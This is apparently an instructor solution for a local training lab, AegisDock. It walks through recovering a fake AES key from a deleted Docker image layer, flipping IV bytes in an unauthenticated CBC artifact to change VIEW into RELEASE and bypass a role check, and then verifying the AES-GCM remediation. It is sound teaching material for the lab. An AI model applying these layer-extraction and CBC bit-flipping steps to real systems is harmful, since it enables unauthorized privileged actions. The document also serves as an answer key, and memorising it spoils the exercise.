# AegisDock Instructor Solution

> Instructor-only material. Do not publish this document as the learner-facing guide in a competition deployment.

## 1. Expected chain

```text
Reconnaissance
  -> Local registry metadata
  -> Download vulnerable image tar
  -> Inspect saved image layers
  -> Recover generated fake key/IV
  -> Analyze CBC artifact layout
  -> Modify the unauthenticated IV prefix
  -> Vulnerable release controller trusts RELEASE action
  -> Local container state changes
  -> Audit reconstruction
  -> Secure profile rejects tampering and enforces roles
```

The vulnerable Docker layer leak and the CBC weakness are distinct findings. The IV manipulation itself does not mathematically require the AES key; that is an important lesson about unauthenticated encryption. Recovering the key from the image demonstrates a separate key exposure and helps the learner decrypt and understand the artifact. The application must not treat encryption as an integrity or authorization mechanism.

## 2. Recon and authentication

Start the vulnerable profile and seed data:

```bash
make up
make seed
```

Open http://localhost:8080 and sign in with the fake operator account:

- `operator@aegisdock.local` / `Operator123!`

Get an API token using the login endpoint:

```bash
curl -s http://localhost:8080/api/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"operator@aegisdock.local","password":"Operator123!"}'
```

Operational endpoints require a Sanctum bearer token. Map the terminals, containers, and role boundary before testing the release operation.

## 3. Obtain the image

The registry simulator exposes metadata and a download endpoint. The image tar is generated locally by the Makefile; the simulator does not connect to Docker Hub or another registry.

```bash
curl -fL http://localhost:8080/registry/images/aegisdock-terminal-api/download \
  -o /tmp/aegisdock-terminal-api.tar
docker load -i /tmp/aegisdock-terminal-api.tar
docker history --no-trunc aegisdock/api:vulnerable
```

## 4. Recover the generated training configuration

The vulnerable Dockerfile copies `deploy/archive/terminal-gateway.env.bak` into `/opt/legacy/`, then removes it in a later layer. The setup script deletes the build-context fixture after building, but the image layer remains.

```bash
mkdir -p /tmp/aegisdock-image
docker save aegisdock/api:vulnerable -o /tmp/aegisdock-image.tar
tar -xf /tmp/aegisdock-image.tar -C /tmp/aegisdock-image

for layer in $(find /tmp/aegisdock-image -name layer.tar); do
  if tar -tf "$layer" 2>/dev/null | grep -q 'opt/legacy/terminal-gateway.env.bak'; then
    tar -xOf "$layer" opt/legacy/terminal-gateway.env.bak
  fi
done
```

The recovered file contains random fake values named `TERMINAL_CRYPTO_KEY_HEX` and `TERMINAL_CRYPTO_IV_HEX`. Values differ between fresh local setups. Do not put them into documentation, commits, or screenshots.

The final container filesystem should not expose the file:

```bash
docker run --rm --entrypoint sh aegisdock/api:vulnerable \
  -c 'test ! -e /opt/legacy/terminal-gateway.env.bak'
```

## 5. Inspect an authorization artifact

Use the operator token to request an artifact for the primary scenario:

```bash
curl -s 'http://localhost:8080/api/authorization/artifact?terminal=T-07&container=CONT-88421' \
  -H "Authorization: Bearer $TOKEN"
```

The response includes an artifact ID and a Base64 artifact. The authenticated debug endpoint reports the algorithm, IV, ciphertext length, expiry, and selected metadata; it never returns the key.

```bash
curl -s http://localhost:8080/api/debug/authorization/ARTIFACT_ID \
  -H "Authorization: Bearer $TOKEN"
```

## 6. Deterministic CBC manipulation

The vulnerable artifact format is:

```text
Base64(16-byte IV || CBC ciphertext)

Decrypted plaintext:
bytes 0..7  : fixed-width action field
byte 8      : separator
bytes 9..15 : spaces
byte 16+    : JSON metadata
```

The original action field is eight bytes: `VIEW    `. The desired field is also eight bytes: `RELEASE `.

CBC's first plaintext block is:

```text
P1 = D_K(C1) XOR IV
```

For each of the first eight bytes, calculate:

```text
delta[i] = original_action[i] XOR desired_action[i]
new_IV[i] = old_IV[i] XOR delta[i]
```

Change only the first eight bytes of the IV prefix in the decoded artifact; leave the ciphertext unchanged and Base64-encode the modified IV plus ciphertext. The JSON metadata begins in the next block, so this change preserves it. The artifact is unauthenticated, so the server has no tag or MAC with which to detect the modification.

Use Burp Repeater or a manual decoder/editor in the local lab. Do not run this against any external service.

## 7. Demonstrate impact

Send the modified artifact with the operator token:

```http
POST /api/containers/CONT-88421/release
Authorization: Bearer <operator-token>
X-Terminal-Authorization: <modified-base64-artifact>
Content-Type: application/json

{"reason":"scheduled release"}
```

The vulnerable release controller trusts the decrypted RELEASE action when an artifact is supplied and skips the normal role check. The operation changes only the local database state from READY to RELEASED. No physical terminal or external system is contacted.

A normal VIEW artifact should be rejected by the release endpoint. A request without an artifact should also be denied to an operator. This baseline is important: the intended chain depends on the artifact being accepted after its action field is altered.

## 8. Forensics

Use the authenticated audit endpoint:

```bash
curl -s http://localhost:8080/api/audit \
  -H "Authorization: Bearer $TOKEN"
```

Look for a timeline containing the release attempt, authorization result, and container release. Correlate user ID, container, terminal, timestamp, IP, user-agent, action, and result. The application must never log the actual key.

## 9. Remediation verification

Build and start the secure profile:

```bash
make secure-up
```

The secure profile uses a separate runtime-mounted key and AES-256-GCM with a unique nonce and authentication tag. The secure release path enforces server-side role authorization before considering the artifact and binds any supplied artifact to the authenticated user, terminal, container, action, and expiry.

Verify:

- An operator cannot release a container, even with a valid artifact.
- A supervisor can perform an authorized simulated release.
- A modified secure artifact fails authentication.
- Expired artifacts are rejected.
- The secure Docker image does not contain the generated key/IV values in any layer.
- The vulnerable image's final filesystem lacks the removed archive file.
- Audit records remain useful and contain no key material.

```bash
make test
docker history --no-trunc aegisdock/api:secure
trivy image aegisdock/api:secure
```

## 10. Core teaching points

- Docker layer deletion does not erase historical bytes.
- Key exposure and ciphertext malleability are separate weaknesses.
- CBC without authentication does not guarantee integrity.
- An unauthenticated IV can change the first plaintext block predictably.
- Encrypted client data is not a substitute for server-side authorization.
- AEAD, runtime-only secrets, role checks, and regression tests break different links in the chain.
